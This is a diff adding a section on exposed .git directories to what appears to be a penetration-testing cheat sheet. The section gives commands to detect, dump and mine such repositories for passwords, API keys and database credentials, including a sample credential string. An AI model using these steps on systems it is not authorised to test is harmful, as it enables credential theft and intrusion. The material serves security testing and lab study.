@@ -101,6 +101,78 @@ curl http://TARGET/robots.txt
 
 ---
 
+## Exposed .git Directory
+
+If a `.git` directory is accessible, dump and extract for source code, credentials, and history.
+
+### Detection
+
+```bash
+# Check for exposed .git
+curl -s http://TARGET/.git/HEAD
+# Valid response: ref: refs/heads/master
+
+# Nmap detection
+nmap -sC -sV TARGET
+# http-git: 10.129.x.x:80/.git/
+#   Git repository found!
+```
+
+### Dumping with git-dumper
+
+```bash
+# Install
+pip3 install git-dumper
+
+# Or use GitTools
+git clone https://github.com/internetwache/GitTools.git
+
+# Dump repository
+./GitTools/Dumper/gitdumper.sh http://TARGET/.git/ ./git-dump
+
+# Extract all commits
+./GitTools/Extractor/extractor.sh ./git-dump ./extracted
+```
+
+### Manual Enumeration
+
+```bash
+# List commits
+cd extracted/0-*
+git log --oneline
+
+# View specific commit
+git show COMMIT_HASH
+
+# Search for secrets
+grep -r "password" .
+grep -r "secret" .
+grep -r "api_key" .
+grep -r "@" . | grep -i mail  # Find email addresses
+```
+
+### Common Findings
+
+| File | Content |
+|------|---------|
+| `settings.php` | Database credentials |
+| `.env` | Environment variables, API keys |
+| `config/*.json` | Application configuration |
+| `wp-config.php` | WordPress DB creds |
+| `.htpasswd` | HTTP basic auth hashes |
+
+### Example: Backdrop/Drupal settings.php
+
+```bash
+# Parse settings.php for DB creds
+cat settings.php | grep -Ev "^//|\*"
+
+# Output format:
+$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
+```
+
+---
+
 ## .well-known URIs
 
 ```bash
